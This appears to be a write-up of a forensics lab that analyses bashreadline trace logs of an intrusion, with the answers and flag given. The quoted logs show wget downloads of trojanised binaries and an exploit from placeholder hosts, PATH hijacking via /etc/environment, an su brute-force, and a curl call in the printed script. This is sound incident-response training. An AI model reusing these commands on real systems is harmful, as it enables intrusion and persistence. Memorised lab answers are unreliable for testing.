#### 7. Bashreadline: Trace Analysis

----

Performance monitoring and tracking tools can provide a wealth of information about a running system. In some cases, they can help identify anomalies which could have been caused by a security incident.

----

In this lab, we will analyze [`Bashreadline script's`](https://github.com/iovisor/bcc/blob/master/tools/bashreadline.py) trace logs to unearth suspicious activity. Please start the lab, answer the below questions and submit the flags to verify:

- A suspicious user had logged into the system and had downloaded some files using wget. What is the name of that user?

```sh
root@attackdefense:~# less logs
TIME      PID    COMMAND
23:11:11  75190  apt-get update && apt-get upgrade
23:11:16  75190  ./take-backup.sh
23:11:17  72741  su alice
23:11:17  75190  ./commit-backup.sh
23:11:18  72741  whoami
23:11:18  75190  ./push-backup.sh
23:11:19  72741  mkdir /tmp/.bin/
23:11:20  72741  wget -O /tmp/.bin/ls http://random-url.xyz.local/?getbin=ls
23:11:26  72741  wget -O /tmp/.bin/ps http://random-url.xyz.local/?getbin=ps
23:11:32  72741  wget -O /tmp/.bin/bash http://random-url.xyz.local/?getbin=bash
23:11:37  75190  apt-get install mysql-server
23:11:38  72741  wget -O /tmp/.bin/cd http://random-url.xyz.local/?getbin=cd
23:11:44  72741  wget -O /tmp/.bin/whoami http://random-url.xyz.local/?getbin=whoami
23:11:50  72741  wget -O /tmp/.bin/sudo http://random-url.xyz.local/?getbin=sudo
23:11:56  72741  chmod +x /tmp/.bin/*
23:11:57  72741  echo $PATH
23:11:58  72741  export PATH=/tmp/.bin:$PATH
23:11:59  72741  echo "/tmp/.bin:$PATH" > /etc/environment | sudo tee -a /etc/environment
23:12:02  72741  wget -O /tmp/exe http://random-url.xyz.local/?getexploit=x86-64_16.04_4.15.0-52-
23:12:08  72741  chmod +x /tmp/exe
23:12:09  72741  /tmp/exe
23:12:10  75190  apt-get install git cmake
23:12:11  72741  su ratchel
23:12:11  75190  apt-get autoremove
23:12:12  72741  su ratchel
23:12:12  75190  git init /opt/deployment
23:12:13  72741  su ratchel
23:12:13  75190  cd /opt/deployment
23:12:14  72741  su ratchel
23:12:14  75190  git add *
23:12:15  72741  su ratchel
23:12:15  75190  git status
23:12:16  75190  git commit -m "Major bugfixes -- v3.1.0"
23:12:16  72741  su ratchel
23:12:17  72741  su ratchel
23:12:17  75190  git status
23:12:18  75190  git log
23:12:18  72741  su ratchel
23:12:19  72741  su ratchel
23:12:19  75190  git push remote origin
23:12:20  72741  su ratchel
23:12:20  75190  git status
23:12:20  75190  apt-get install python2.7 python2.7-pip
23:12:21  72741  su ratchel
23:12:21  75190  pip install pycrypto
23:12:22  75190  pip install pycrypto --user
23:12:22  72741  su ratchel
23:12:23  72741  su ratchel
23:12:23  75190  apt-get install dnsutils
23:12:24  72741  su ratchel
23:12:24  75199  apt-get install firefox
23:12:25  72741  su ratchel
23:12:25  75199  apt-get install feh
23:12:26  72741  su ratchel
23:12:26  75190  reset
23:12:27  72741  su ratchel
23:12:27  75190  ifconfig
23:12:28  72741  su ratchel
23:12:28  75190  netstat -antp
23:12:29  72741  su ratchel
23:12:29  75199  firefox stackoverflow.com
23:12:30  72741  su ratchel
logs
```

```sh
root@attackdefense:~# less logs
root@attackdefense:~# less logs
root@attackdefense:~#
root@attackdefense:~#
root@attackdefense:~# grep 72741 logs
23:11:17  72741  su alice
23:11:18  72741  whoami
23:11:19  72741  mkdir /tmp/.bin/
23:11:20  72741  wget -O /tmp/.bin/ls http://random-url.xyz.local/?getbin=ls
23:11:26  72741  wget -O /tmp/.bin/ps http://random-url.xyz.local/?getbin=ps
23:11:32  72741  wget -O /tmp/.bin/bash http://random-url.xyz.local/?getbin=bash
23:11:38  72741  wget -O /tmp/.bin/cd http://random-url.xyz.local/?getbin=cd
23:11:44  72741  wget -O /tmp/.bin/whoami http://random-url.xyz.local/?getbin=whoami
23:11:50  72741  wget -O /tmp/.bin/sudo http://random-url.xyz.local/?getbin=sudo
23:11:56  72741  chmod +x /tmp/.bin/*
23:11:57  72741  echo $PATH
23:11:58  72741  export PATH=/tmp/.bin:$PATH
23:11:59  72741  echo "/tmp/.bin:$PATH" > /etc/environment | sudo tee -a /etc/environment
23:12:02  72741  wget -O /tmp/exe http://random-url.xyz.local/?getexploit=x86-64_16.04_4.15.0-52-
23:12:08  72741  chmod +x /tmp/exe
23:12:09  72741  /tmp/exe
23:12:11  72741  su ratchel
23:12:12  72741  su ratchel
23:12:13  72741  su ratchel
23:12:14  72741  su ratchel
23:12:15  72741  su ratchel
23:12:16  72741  su ratchel
23:12:17  72741  su ratchel
23:12:18  72741  su ratchel
23:12:19  72741  su ratchel
23:12:20  72741  su ratchel
23:12:21  72741  su ratchel
23:12:22  72741  su ratchel
23:12:23  72741  su ratchel
23:12:24  72741  su ratchel
23:12:25  72741  su ratchel
23:12:26  72741  su ratchel
23:12:27  72741  su ratchel
23:12:28  72741  su ratchel
23:12:29  72741  su ratchel
23:12:30  72741  su ratchel
23:12:31  72741  su ratchel
23:12:32  72741  su ratchel
23:12:33  72741  su ratchel
23:12:34  72741  su ratchel
23:12:35  72741  su ratchel
23:12:36  72741  su ratchel
23:12:37  72741  su ratchel
23:12:38  72741  su ratchel
23:12:39  72741  su ratchel
23:12:40  72741  su ratchel
23:12:41  72741  su ratchel
23:12:42  72741  su ratchel
23:12:43  72741  su ratchel
23:12:44  72741  su ratchel
23:12:45  72741  su ratchel
23:12:46  72741  su ratchel
23:12:47  72741  su ratchel
23:12:48  72741  su ratchel
23:12:51  72741  wget -O /tmp/.bin/su http://random-url.xyz.local/?getbin=su
23:12:56  72741  chmod +x /tmp/.bin/su
23:12:57  72741  su ratchel
23:13:00  72741  whoami
23:13:01  72741  passwd
23:13:31  72741  sudo su
23:13:34  72741  modprobe random-dummy-module
23:13:48  72741  exit
root@attackdefense:~#
```

```
alice
```

- The suspicious user prepended a directory to the PATH environment variable. What is the complete path of that directory?

```
# root@attackdefense:~# grep 72741 logs
/tmp/.bin
```

- The suspicious user downloaded some files from a remote machine using wget. What is the domain name of the remote machine?

```
# root@attackdefense:~# grep 72741 logs
random-url.xyz.local
```

- The suspicious user had also downloaded a script from the same remote machine in /tmp directory. That script was executed as soon as it was downloaded. Provide the complete path of that script.

```
# root@attackdefense:~# grep 72741 logs
/tmp/exe
```

- Retrieve the flag from the script downloaded in /tmp directory.

```sh
root@attackdefense:~# grep 72741 logs
```

```sh
root@attackdefense:~# cat /tmp/exe
#!/bin/bash

#FLAG: 72831b53f0bc6f677815a399d3007f12

curl http://another-random-server.dev.local/?execute=true&sys=x86_64&os=ubuntu-16.04-linux
root@attackdefense:~#
```

```
72831b53f0bc6f677815a399d3007f12
```

- The suspicious user broke into another user’s account after a couple of unsuccessful attempts. What is the name of the compromised user?

```
# root@attackdefense:~# grep 72741 logs
ratchel
```

- What is the name of the kernel module loaded by the suspicious user?

```
# root@attackdefense:~# grep 72741 logs
random-dummy-module
```

----

###### Reference

- [Bashreadline script](https://github.com/iovisor/bcc/blob/master/tools/bashreadline.py)
- [Bashreadline Examples](https://github.com/iovisor/bcc/blob/master/tools/bashreadline_example.txt)
- [BCC Tools](https://github.com/iovisor/bcc)

----

EOF
